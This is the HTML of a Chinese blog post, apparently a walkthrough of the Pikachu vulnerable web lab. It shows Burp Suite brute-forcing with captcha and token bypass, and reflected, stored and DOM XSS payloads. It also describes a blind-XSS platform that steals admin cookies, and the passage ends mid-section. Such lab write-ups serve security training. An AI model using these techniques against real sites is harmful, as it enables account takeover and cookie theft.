@@ -1,0 +1,968 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pikachu 靶场渗透记录 | Jackhou Blog</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 靶场介绍Pikachu 是一个带有漏洞的 Web 应用系统，在这里包含了常见的 web 安全漏洞。 如果你是一个 Web 渗透测试学习人员且正发愁没有合适的靶场进行练习，那么 Pikachu 可能正合你意。 0x02 漏洞类型 Burt Force(暴力破解漏洞)  XSS(跨站脚本漏洞)  CSRF(跨站请求伪造)  SQL-Inject(SQL 注入漏洞)  RCE(远程命令 &amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu 靶场渗透记录">
+<meta property="og:url" content="http://example.com/2023/04/14/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/index.html">
+<meta property="og:site_name" content="Jackhou Blog">
+<meta property="og:description" content="0x01 靶场介绍Pikachu 是一个带有漏洞的 Web 应用系统，在这里包含了常见的 web 安全漏洞。 如果你是一个 Web 渗透测试学习人员且正发愁没有合适的靶场进行练习，那么 Pikachu 可能正合你意。 0x02 漏洞类型 Burt Force(暴力破解漏洞)  XSS(跨站脚本漏洞)  CSRF(跨站请求伪造)  SQL-Inject(SQL 注入漏洞)  RCE(远程命令 &amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-04-13T16:58:48.833Z">
+<meta property="article:modified_time" content="2023-04-13T18:20:50.020Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/14/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu 靶场渗透记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-14 02:20:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Jackhou Blog"><span class="site-name">Jackhou Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pikachu 靶场渗透记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-13T16:58:48.833Z" title="Created 2023-04-14 00:58:48">2023-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-13T18:20:50.020Z" title="Updated 2023-04-14 02:20:50">2023-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pikachu 靶场渗透记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01-靶场介绍"><a href="#0x01-靶场介绍" class="headerlink" title="0x01 靶场介绍"></a>0x01 靶场介绍</h1><p>Pikachu 是一个带有漏洞的 Web 应用系统，在这里包含了常见的 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=web%E5%AE%89%E5%85%A8&spm=1001.2101.3001.7020">web 安全</a>漏洞。 如果你是一个 Web 渗透测试学习人员且正发愁没有合适的靶场进行练习，那么 Pikachu 可能正合你意。</p>
+<h1 id="0x02-漏洞类型"><a href="#0x02-漏洞类型" class="headerlink" title="0x02 漏洞类型"></a>0x02 漏洞类型</h1><ul>
+<li><p>Burt Force(暴力破解漏洞)</p>
+</li>
+<li><p>XSS(跨站脚本漏洞)</p>
+</li>
+<li><p>CSRF(跨站请求伪造)</p>
+</li>
+<li><p>SQL-Inject(SQL 注入漏洞)</p>
+</li>
+<li><p>RCE(远程命令 &#x2F; 代码执行)</p>
+</li>
+<li><p>Files Inclusion(文件包含漏洞)</p>
+</li>
+<li><p>Unsafe file downloads(不安全的文件下载)</p>
+</li>
+<li><p>Unsafe file uploads(不安全的文件上传)</p>
+</li>
+<li><p>Over Permisson(越权漏洞)</p>
+</li>
+<li><p>…&#x2F;…&#x2F;…&#x2F;(目录遍历)</p>
+</li>
+<li><p>I can see your ABC(敏感信息泄露)</p>
+</li>
+<li><p>PHP 反序列化漏洞</p>
+</li>
+<li><p>XXE(XML External Entity attack)</p>
+</li>
+<li><p>不安全的 URL 重定向</p>
+</li>
+<li><p>SSRF(Server-Side Request Forgery)</p>
+</li>
+</ul>
+<h1 id="0x03-WriteUP"><a href="#0x03-WriteUP" class="headerlink" title="0x03 WriteUP"></a>0x03 WriteUP</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>“暴力破解” 是一攻击具手段，在 web 攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
+<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个 web 应用系统存在暴力破解漏洞，一般是指该 web 应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的 “可能性” 变的比较高。 这里的认证安全策略, 包括：</p>
+<ol>
+<li>是否要求用户设置复杂的密码；  </li>
+<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机 otp；  </li>
+<li>是否对尝试登录的行为进行判断和限制（如：连续 5 次错误登录，进行账号锁定或 IP 地址锁定等）；  </li>
+<li>是否采用了双因素认证；<br>… 等等。<br>千万不要小看暴力破解漏洞, 往往这种简单粗暴的攻击方式带来的效果是超出预期的!</li>
+</ol>
+<h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c5067c167e6a36d7c787fe8fefb1a494.png" alt="123"></p>
+<p>开启 burp 抓包，输入 admin 和任意密码点击登录，将请求包发送至 Intruder 模块中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/baf25f1f3d9f4ffdb43c43ac2eebf17a.png"></p>
+<p>加载密码字典</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7c77d36c41de40e6857fb3ffb74ce951.png"></p>
+<p>爆破成功，用户名<code>admin</code> 密码<code>123456</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/543768db11a394eb64487d3282e320e5.png"></p>
+<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过 (on server)"></a>验证码绕过 (on server)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/eead091f3000f9fd3792c51a97a4b3a3.png"></p>
+<p>这一关需要设置下 burp 的 MIME type 过滤器，将<code>Images</code>勾选上</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b9537fa8a86cc42bd04f09349edf218f.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/802a29f72c2f4ac9dc77f32e04b6a264.png"></p>
+<p>在 HTTP History 中可以看到以下请求，每次刷新验证码时会向服务端发送请求，响应包中 Set-Cookie 会将新的验证码返回到前端，我们可以利用这个逻辑漏洞进行暴力破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.109/inc/showvcode.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/22851ff2e94761fa371da94f0feb19fc.png"></p>
+<p>此时前端显示的验证码确定就是响应包中返回来的值</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bbc28e32ead4aa893a7c91c56106dedb.png"></p>
+<p>要利用这个逻辑漏洞需要使用 burp 上的<code>Macros</code>功能，菜单路径如下：</p>
+<p>Project options → Sessions → Macros</p>
+<p>点击 Add，选中验证码刷新的请求包，点击 OK</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cde41647530a166e9a1e217d9af25c93.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91916b89acf22982906bb3fab02ea230.png"></p>
+<p>点击 Configure item</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c3e93e3ef2464ff344d367901aa679fa.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d4a43112ea58e7940c8b3e9d5259ca26.png"></p>
+<p>输入参数名<code>vcode</code>（注意此处的参数名必须要与进行替换的请求包中的参数名相同），然后使用鼠标选中 Set-Cookie 中的验证码，点击 OK</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3d406336a541bf47c91d7ec8aad2466f.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b23cb7586cf24b0e603375b4b09f9186.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9dba6876687701b7be9b1349cb2a27ac.png"></p>
+<p>然后点击<code>Session Handling Rules</code>功能的 Add，设置 Macro 的生效范围</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fec060a781d7cdf08d00a90f782ca311.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d53c57cf8ce973e33a8f00d460125659.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a947a89f3ed34656164c6c39964859f7.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cadd1eb1dc8907e410f5890217592398.png"></p>
+<p>此处可以只设置 Intruder 为生效范围，然后添加 URL Scope 设置仅对指定的 URL 应用 Macros 规则</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3316fd5e6a995a74f61c64d0c3335aae.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c911aa3fc82162a869a447aee06a9143.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d5a8e9ec66a5e6f876fe76ad95732068.png"></p>
+<p>设置好之后，同样的将登陆请求包发送至 Intruder 模块，设置密码字典进行爆破，此时通过 Intruder 模块发送出去的每个请求包的<code>vcode</code>值都会自动刷新获取并带入到请求包中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8e8e3ef73d46f19f5f9fb2da3a40788a.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d85542e6623d85fe79518d2c17a5ae01.png"></p>
+<p>爆破成功，用户名<code>admin</code> 密码<code>123456</code></p>
+<blockquote>
+<p>如果爆破失败 请重新抓取登录请求包发送到 Intruder 模块进行爆破</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/123e5e1d4b4e48787f0615ee297c28ce.png"></p>
+<p>本关测试结束后记得将该 Session 规则关闭</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7a76868549b3f20282a60de81dd3ee41.png"></p>
+<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过 (on client)"></a>验证码绕过 (on client)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e3edc83173af74a9a109fe9df28b84c7.png"></p>
+<p>本关的验证码是前端 JS 生成，且仅在前端进行校验，只需要输入一次正确的验证码抓到请求包后将验证码删除即可重复发送登陆请求进行爆破</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7528e2159ed44fd54a1a657edb30cce5.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5aedafbd033b1c9e696588f293dcc81f.png"></p>
+<p>将验证码参数设置为空发送请求依然能进行账号密码校验，服务端正常返回信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7468fe2bbcf9e1f723fb2f64e4d45d4a.png"></p>
+<p>接下来还是老规则将请求包发送到 Intruder 模块中进行爆破即可</p>
+<h3 id="token-防爆破"><a href="#token-防爆破" class="headerlink" title="token 防爆破?"></a>token 防爆破?</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e1c1b515f8fddca2933e0d37b619c42d.png"></p>
+<p><strong>第一种方式：利用 Macros</strong></p>
+<p>本关在登录时加入了 CSRF token 机制，Token 保存在该页面的前端代码中，本关的利用方式与验证码绕过 (on server) 的相同，使用 Macros 获取前端页面的 token 值然后带入到之后的登录请求包中即可完成暴力破解</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b8acb31c219ee438888915abb34cf322.png"></p>
+<p>新建一个 Macros 宏</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4d8e9c19e6a3ca0dcbfb59c18064571b.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/55fcde7cddde2fb0b853589d858d5047.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6c9f130ed8341631d40fa94a7e1c1dce.png"></p>
+<p>设置会话处理规则 (Session Handling Rules)</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/90e30a083f9a760822920e1cd987f22a.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/878b0fe03fa9998bacd95fa0129f7f5b.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7f23554cbca969337c216033949263f7.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d385ccab062ae02727add5774a483e5a.png"></p>
+<p>然后将登陆请求包发送至 Intruder 模块中加载密码字典进行爆破即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f9251c577a33f1745799ad8d79c16ed2.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dae649dfba30bf4ad2ad316e49bf68b9.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b8828264f626e29c8f2d2a478aeeccd1.png"></p>
+<p><strong>第二种方式：利用 Intruder 的 recursive grep</strong></p>
+<p>将请求包发送至 Intruder 模块，由于现在需要同时爆破 password 和 token 字段，所以我们此处的<code>Attack type</code>攻击模式要设置成<code>Pitchfork</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bb35ec93ff9f6b9f9b7862d298b29164.png"></p>
+<p>payload 设置：</p>
+<p>payload 1 直接加载密码字典</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f2249696eb421cf15cf56c6f24d59c08.png"></p>
+<p>payload 2 需要设置递归搜索（token）</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eadce55195125743c1923677c2d2cdc4.png"></p>
+<blockquote>
+<p>recursive grep，就是从上一次的响应结果中，取得部分特定内容作为下次请求的 Payload 的模式</p>
+</blockquote>
+<p>按照提示在 Options → Grep - Extract 处设置递归选取的内容：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/15121db3e9ac12c40232c33d37f756e1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea81bfbaba75b8e5d117dd4de6642a.png"></p>
+<p>另外涉及递归与重定向，线程数设置为 1，重定向选项设置为 always</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2d5af7a773c7105515aa27990b8575c6.png"></p>
+<p>老版本的 burp 线程设置方式如下</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5ab04d269380a98063ced5b7248a96b3.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/86c2ef3341cc60dbdf393e3c714e493e.png"></p>
+<p>然后回到 payload 页面点击开始爆破即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7d47a33bd96845f898518c36d74a927e.png"></p>
+<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS (Cross-Site Scripting)"></a>XSS (Cross-Site Scripting)</h2><p>Cross-Site Scripting 简称为 “CSS”，为避免与前端叠成样式表的缩写 “CSS” 冲突，故又称 XSS。一般 XSS 可以分为如下几种常见类型：  </p>
+<ol>
+<li>反射性 XSS;  </li>
+<li>存储型 XSS;<br>3.DOM 型 XSS;</li>
+</ol>
+<p>XSS 漏洞一直被评估为 web 漏洞中危害较大的漏洞，在 OWASP TOP10 的排名中一直属于前三的江湖地位。</p>
+<p>XSS 是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
+<p>形成 XSS 漏洞的主要原因是程序对输入和输出没有做合适的处理，导致 “精心构造” 的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>因此在 XSS 漏洞的防范上，一般会采用 “对输入进行过滤” 和“输出进行转义”的方式进行处理:</p>
+<p>输入过滤：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入;</p>
+<p>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
+<h3 id="反射型-xss-get"><a href="#反射型-xss-get" class="headerlink" title="反射型 xss(get)"></a>反射型 xss(get)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/0cf39434326ea729672d7ff67216045e.png"></p>
+<p>输入 123 并查看前端代码，123 加载到了 p 标签中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6de05fbca87bfd3edc52a407f13550c3.png"></p>
+<p>尝试直接插入 xss payload，由于是 Get 的请求方式并且文本框设置了<code>maxlength</code>(文本最大长度限制)，所以我们可以在 URL 中直接插入 xss payload 触发漏洞，以下 payload 均可触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br><span class="line">&lt;details+open+ontoggle=prompt(1)&gt;</span><br><span class="line">&lt;svg/onload=confirm(1)&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/49a9c0da012ee5cc83809ee5112ed366.png"></p>
+<p>查看前端代码，xss payload 被插入到了 p 标签当中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a5633c5bb00e03b94b5d5079f526a384.png"></p>
+<h3 id="反射性-xss-post"><a href="#反射性-xss-post" class="headerlink" title="反射性 xss(post)"></a>反射性 xss(post)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/39d4d010d60b3946df56c96f898cadd8.png"></p>
+<p>本关需要先输入账号密码登陆</p>
+<p>用户名<code>admin</code> 密码 <code>123456</code></p>
+<p>登录成功后在文本框中输入 123 点击 submit，页面仍会将 123 显示到前端页面中，只是请求方式变成了 POST</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/20833f67f37c9cb9c5c62d960e8a440f.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01f907e1ff57408bf9fe470f205cfd35.png"></p>
+<p>接下来开启 burp 抓包，然后输入 123 点击 submit，然后将请求包的 message 修改为 xss 的 payload 并放包</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/94f096963a53218ab8d96caeccf5f0e0.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9a6009aec4fd3474b3efea584b5f8c6b.png"></p>
+<p>查看前端代码，xss payload 被插入 p 标签中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b473db64da129cd0d45fcbf6ae5d634e.png"></p>
+<h3 id="存储型-xss"><a href="#存储型-xss" class="headerlink" title="存储型 xss"></a>存储型 xss</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/ba75d13fc47dfe34c3c072025ccd286d.png"></p>
+<p>存储型 xss 顾名思义也就是我们输入的内容会被存储到数据库中，当用户访问时页面会将数据库的查询结果显示到页面上</p>
+<p>同样的本关可以直接在多行文本框中输入 xss payload 点击 submit 提交即可触发 xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/οnlοad=confirm(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44905491d6015093394d2d23c1990207.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/07b4336d46f7015de9ae94f55972022b.png"></p>
+<h3 id="DOM-型-xss"><a href="#DOM-型-xss" class="headerlink" title="DOM 型 xss"></a>DOM 型 xss</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/ea51cc6dffd0ed03d3e18511e8b1e700.png"></p>
+<p>DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情，无法通过 WAF 防护。</p>
+<p>js 中，从 url 中获得参数并将其作为 js 执行，就有可能导致 DOM XSS</p>
+<p>本关我们输入 123 后，点击 click me 下面显示出来 what do you see?，我们查看前端代码发现 123 直接赋值给了 a 标签的 href，这就导致了 xss 漏洞产生</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/14002c44640f73e428f051d84bda3d58.png"></p>
+<p>此时我们可以直接使用以下 payload 触发 xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fff83beb0bb75045707562563b235ceb.png"></p>
+<p>提交之后鼠标点击 a 链接即可触发 xss</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aaef8cbeca14b499a96bfa0fa2204eb2.png"></p>
+<h3 id="DOM-型-xss-x"><a href="#DOM-型-xss-x" class="headerlink" title="DOM 型 xss-x"></a>DOM 型 xss-x</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/83d7454d51b4d8fb72bc7d9b88c3d57e.png"></p>
+<p>本关使用的 payload 与上一关相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0f9b3c7d7b324dd348a2883d5c869fb4.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/36383fb287e72e97c423932edc8829c7.png"></p>
+<p>查看前端代码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52517f1c52657c6f478b150b97ccda56.png"></p>
+<h3 id="xss-之盲打"><a href="#xss-之盲打" class="headerlink" title="xss 之盲打"></a>xss 之盲打</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7341e8d26ac2fab9fa3c207027f8daa5.png"></p>
+<p>XSS 盲打不是一种漏洞类型而是一种 xss 漏洞的利用方式，攻击者可以在网站留言板、反馈建议等功能点提交恶意的 xss payload，如果该网站存在 xss 漏洞，当管理员在后台查看用户留言页面时就会执行 xss payload，xss 盲打最主要的目的是通过加载外部的恶意 js 文件 (通过 xss 盲打平台生成) 获取管理员后台的 Cookie 信息，攻击者就可以使用管理员的身份访问网站后台从而进一步发动攻击</p>
+<p>首先将 xss payload 填入文本框并提交</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e899ed6e7d0aad3ee69fac048e3e97db.png"></p>
+<p>点击右上角的提示信息，获取到管理后台的地址<code>/vul/xss/xssblind/admin_login.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/474fb764cde588f1bd7926268f73ad59.png"></p>
+<p>输入账号密码进行登录 <code>admin 123456</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1b3d87af14866ac3591988286bdd6290.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f6fffcb5a3ff1630f298a28d3be2e68a.png"></p>
+<p>查看前端代码，刚刚提交的 xss payload 被插入到 td 标签中执行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/57bbec8cba8e82f2c6341858206115c7.png"></p>
+<p>接下来演示下使用 xss 盲打平台生成恶意的 js 进行远程加载获取管理员的 cookie 信息</p>
+<blockquote>
+<p>本次使用的 xss 盲打平台：<a target="_blank" rel="noopener" href="http://xsscom.com/" title="http://xsscom.com/">http://xsscom.com/</a></p>
+</blockquote>
+<p>注册好账号后 点击创建项目，输入任意项目名称点击下一步</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/17594d45c4e2d4cd2c578714bfea7cc9.png"></p>
+<p>根据实际情况进行勾选即可，这里我勾选默认模块、xss.js，然后点击下一步</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c98d41795924f8b0b89c0f40bba170e9.png"></p>
+<p>在项目代码中可以复制下方的 payload 直接插入使用</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e2c52d95e38e456f45e3ae422614a463.png"></p>
